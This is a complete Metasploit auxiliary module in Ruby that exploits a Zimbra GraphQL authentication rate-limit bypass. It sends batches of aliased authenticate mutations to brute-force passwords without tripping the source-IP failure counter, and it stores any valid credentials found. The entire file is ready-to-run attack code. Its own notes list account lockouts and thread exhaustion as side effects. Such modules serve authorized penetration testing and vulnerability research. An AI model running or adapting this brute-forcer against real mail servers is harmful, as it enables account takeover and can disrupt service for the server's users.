##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Zimbra GraphQL Authentication Rate Limit Bypass',
        'Description' => %q{
          Zimbra Collaboration Network Edition exposes an unauthenticated GraphQL
          authenticate mutation. Failed GraphQL authentication does not update the
          source-IP failure counter enforced for SOAP authentication. GraphQL aliases
          also permit many password candidates to be submitted in one HTTP request.

          This module uses the standard Metasploit credential options and sends the
          resulting username and password pairs through batches of aliased authenticate
          mutations. A successful password is stored as a credential, but the returned
          authentication token is not displayed or stored. An enabled per-account
          lockout policy can still lock local target accounts.

          Zimbra 10.1.0 through 10.1.21 are known to be affected. No fixed release has
          been published.
        },
        'Author' => [
          'Crypto-Cat' # Discovery, analysis, PoC, and module development
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2026-93637'],
          ['URL', 'https://www.rapid7.com/blog/post/ve-breaking-zimbra-identity-boundaries-part-1/'],
          ['URL', 'https://github.com/jburgess-r7/zimbra-vulnerability-tracker/blob/main/vulnerabilities/CVE-2026-93637.md']
        ],
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [SERVICE_RESOURCE_LOSS],
          'Reliability' => [],
          'SideEffects' => [ACCOUNT_LOCKOUTS, IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Zimbra GraphQL endpoint', '/service/extension/graphql']),
        OptInt.new('BATCH_SIZE', [true, 'Authenticate mutations sent per HTTP request', 50])
      ]
    )
    deregister_options('ANONYMOUS_LOGIN')
  end

  def check_host(_ip)
    result = probe_graphql_authentication

    if result[:status] == :rejected && result[:submitted] == 2
      evidence = 'Two aliased GraphQL authenticate operations ran in one unauthenticated HTTP request'
      return Msf::Exploit::CheckCode::Detected(evidence)
    end

    case result[:status]
    when :not_found
      Msf::Exploit::CheckCode::Safe('The Zimbra GraphQL extension endpoint is not present')
    when :success
      Msf::Exploit::CheckCode::Unknown('The randomized GraphQL probe unexpectedly returned an authentication token')
    else
      Msf::Exploit::CheckCode::Unknown("Unable to verify aliased Zimbra authentication: #{result[:reason]}")
    end
  end

  def run_host(ip)
    validate_options!

    probe = probe_graphql_authentication
    service = record_graphql_service(ip) if %i[rejected success].include?(probe[:status])
    unless probe[:status] == :rejected && probe[:submitted] == 2
      fail_for_result!(probe, 'verify aliased Zimbra GraphQL authentication')
    end

    state = {
      requests: 0,
      submitted: 0,
      successes: 0,
      successful_users: {},
      stop: false
    }
    batch = []

    # This loop buffers candidates, so AuthBrute's request delay is applied when each batch is transmitted below.
    each_user_pass(true) do |username, password|
      if state[:successful_users][username]
        :skip_user
      else
        batch << [username, password]
        if batch.length < datastore['BATCH_SIZE']
          nil
        else
          submit_credential_batch!(ip, service, batch, state)
          batch.clear
          state[:stop] ? :next_user : nil
        end
      end
    end

    submit_credential_batch!(ip, service, batch, state) if batch.any? && !state[:stop]

    if state[:submitted].zero?
      fail_with(Failure::BadConfig, 'No username and password candidates were supplied')
    end

    message = "Submitted #{state[:submitted]} credential candidate(s) in #{state[:requests]} GraphQL request(s)"
    if state[:successes].positive?
      print_good("#{message}; found #{state[:successes]} valid credential(s)")
    else
      print_status("#{message}; no accepted credential was returned")
    end
  end

  private

  def validate_options!
    fail_with(Failure::BadConfig, 'BATCH_SIZE must be between 1 and 1,000') unless datastore['BATCH_SIZE'].between?(1, 1_000)
    # AuthBrute delays before yielding a new wave; an unsent batch would otherwise cross that boundary.
    if datastore['BATCH_SIZE'] > 1 && datastore['TRANSITION_DELAY'].to_f.positive?
      fail_with(Failure::BadConfig, 'BATCH_SIZE must be 1 when TRANSITION_DELAY is enabled so credential waves remain separated')
    end
    print_warning('Large GraphQL batches can exhaust Zimbra request threads') if datastore['BATCH_SIZE'] > 100
  end

  def probe_graphql_authentication
    username = Faker::Internet.email(domain: 'invalid.invalid')
    pairs = [
      [username, Faker::Internet.password(min_length: 16)],
      [username, Faker::Internet.password(min_length: 16)]
    ]
    graphql_authenticate(pairs)
  end

  def submit_credential_batch!(ip, service, pairs, state)
    userpass_sleep_interval
    result = graphql_authenticate(pairs)
    state[:requests] += 1
    fail_for_result!(result, 'classify the credential batch') unless %i[rejected success].include?(result[:status])

    state[:submitted] += pairs.length
    result[:hits].each do |hit|
      next if state[:successful_users][hit[:username]] && datastore['STOP_ON_SUCCESS']

      state[:successful_users][hit[:username]] = true
      state[:successes] += 1
      print_good("#{ip}:#{rport} - Valid credential found for #{hit[:username]}")
      store_graphql_credential(ip, service, hit[:username], hit[:password])
    end

    if result[:unclassified].positive?
      print_warning(
        "#{result[:unclassified]} submitted candidate(s) had an unrecognized result and were not treated as rejected"
      )
      fail_with(Failure::UnexpectedReply, 'Stopping after preserving the definite credential result')
    elsif result[:status] == :rejected
      vprint_status("#{ip}:#{rport} - GraphQL rejected #{pairs.length} credential candidate(s)")
    end

    state[:stop] = result[:hits].any? && datastore['STOP_ON_SUCCESS']
  end

  def graphql_authenticate(pairs)
    query, variables = graphql_batch(pairs)
    response = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI']),
      'ctype' => 'application/json',
      'headers' => { 'Accept' => 'application/json' },
      'data' => { 'query' => query, 'variables' => variables }.to_json
    )
    return { status: :connection_error, reason: 'No HTTP response was received' } unless response
    return { status: :not_found, reason: "HTTP #{response.code}", response: response } if [404, 405].include?(response.code)
    return { status: :http_error, reason: "HTTP #{response.code}", response: response } unless response.code == 200

    classify_graphql_response(response, pairs)
  rescue Rex::ConnectionError => e
    { status: :connection_error, reason: e.message }
  end

  def graphql_batch(pairs)
    declarations = []
    operations = []
    variables = {}
    username_variables = {}

    # Credentials remain GraphQL variables, while aliases correlate reordered results with their candidates.
    pairs.each_with_index do |(username, password), index|
      username_variable = username_variables[username]
      unless username_variable
        username_variable = "u#{username_variables.length}"
        username_variables[username] = username_variable
        declarations << "$#{username_variable}: String!"
        variables[username_variable] = username
      end

      declarations << "$p#{index}: String!"
      variables["p#{index}"] = password
      operations << "a#{index}: authenticate(authInput: {account: {accountBy: name, key: $#{username_variable}}, password: $p#{index}}) { authToken }"
    end

    ["mutation BatchAuth(#{declarations.join(', ')}) { #{operations.join(' ')} }", variables]
  end

  def classify_graphql_response(response, pairs)
    document = response.get_json_document
    return graphql_unexpected(response, 'Response body was not a JSON object') unless document.is_a?(Hash)

    data = document['data']
    errors = document.fetch('errors', [])
    return graphql_unexpected(response, 'GraphQL data was neither an object nor null') unless data.nil? || data.is_a?(Hash)
    return graphql_unexpected(response, 'GraphQL errors was not an array') unless errors.is_a?(Array)

    data ||= {}
    hits = []
    rejected = {}
    unrecognized = []

    pairs.each_with_index do |(username, password), index|
      value = data["a#{index}"]
      token = value['authToken'] if value.is_a?(Hash)
      hits << { alias: "a#{index}", username: username, password: password } if token.is_a?(String) && token.present?
    end

    errors.each do |error|
      path = error['path'] if error.is_a?(Hash)
      alias_name = path.first if path.is_a?(Array) && path.length == 1
      message = error['message'] if error.is_a?(Hash)
      if alias_name.is_a?(String) && alias_name.match?(/\Aa\d+\z/) && authentication_failure?(message, alias_name)
        rejected[alias_name] = true
      else
        unrecognized << error_summary(error)
      end
    end

    conflicting_aliases = {}
    hits.each do |hit|
      next unless rejected.delete(hit[:alias])

      conflicting_aliases[hit[:alias]] = true
      unrecognized << "conflicting authentication results for #{hit[:alias]}"
    end
    hits.reject! { |hit| conflicting_aliases[hit[:alias]] }

    unknown_aliases = pairs.each_index.filter_map do |index|
      alias_name = "a#{index}"
      next if conflicting_aliases[alias_name]
      next if hits.any? { |hit| hit[:alias] == alias_name }
      next if rejected[alias_name]

      alias_name
    end
    unrecognized.concat(unknown_aliases.map { |alias_name| "no classified result for #{alias_name}" })

    if hits.any?
      return {
        status: :success,
        submitted: pairs.length,
        hits: hits,
        unclassified: unrecognized.length,
        reason: unrecognized.first,
        code: response.code,
        response: response
      }
    end

    if rejected.length == pairs.length && unrecognized.empty?
      return {
        status: :rejected,
        submitted: pairs.length,
        hits: [],
        unclassified: 0,
        code: response.code,
        response: response
      }
    end

    graphql_unexpected(response, unrecognized.first || 'Not every GraphQL alias returned an authentication result')
  end

  def authentication_failure?(message, alias_name)
    return false unless message.is_a?(String)

    prefix = "Exception while fetching data (/#{alias_name}) : "
    reason = message.start_with?(prefix) ? message.delete_prefix(prefix) : message
    reason = reason.strip.downcase
    reason.start_with?('authentication failed for [') || reason == 'account.auth_failed' ||
      reason.start_with?('account.auth_failed:')
  end

  def error_summary(error)
    return 'GraphQL returned a non-object error' unless error.is_a?(Hash)

    message = error['message'].to_s
    message.present? ? message[0, 200] : 'GraphQL returned an error without a message'
  end

  def graphql_unexpected(response, reason)
    {
      status: :unexpected,
      submitted: 0,
      hits: [],
      unclassified: 0,
      reason: reason,
      response: response
    }
  end

  def fail_for_result!(result, operation)
    reason = result[:reason] || result[:status].to_s
    case result[:status]
    when :connection_error
      fail_with(Failure::Unreachable, "Unable to #{operation}: #{reason}")
    when :not_found
      fail_with(Failure::NotFound, "Unable to #{operation}: #{reason}")
    else
      fail_with(Failure::UnexpectedReply, "Unable to #{operation}: #{reason}")
    end
  end

  def record_graphql_service(ip)
    @graphql_services ||= {}
    key = [ip, rport, ssl, normalize_uri(datastore['TARGETURI'])]
    return @graphql_services[key] if @graphql_services.key?(key)

    @graphql_services[key] = report_service(graphql_service_data(ip))
  end

  def graphql_service_data(ip)
    common = { host: ip, port: rport, proto: 'tcp' }
    tcp_service = common.merge(name: 'tcp', parents: nil)
    web_service = if ssl
                    common.merge(name: 'https', parents: common.merge(name: 'ssl', parents: tcp_service))
                  else
                    common.merge(name: 'http', parents: tcp_service)
                  end
    common.merge(
      name: 'zimbra-graphql',
      info: 'Zimbra GraphQL authentication endpoint',
      resource: { uri: normalize_uri(datastore['TARGETURI']) },
      parents: web_service
    )
  end

  def store_graphql_credential(ip, service, username, password)
    service_data = {
      origin_type: :service,
      address: ip,
      port: rport,
      service_name: 'zimbra-graphql',
      protocol: 'tcp',
      access_level: 'user'
    }
    service_data[:service_id] = service.id if service

    store_valid_credential(
      user: username,
      private: password,
      private_type: :password,
      proof: 'GraphQL authenticate returned a non-empty authToken',
      service_data: service_data
    )
  end
end
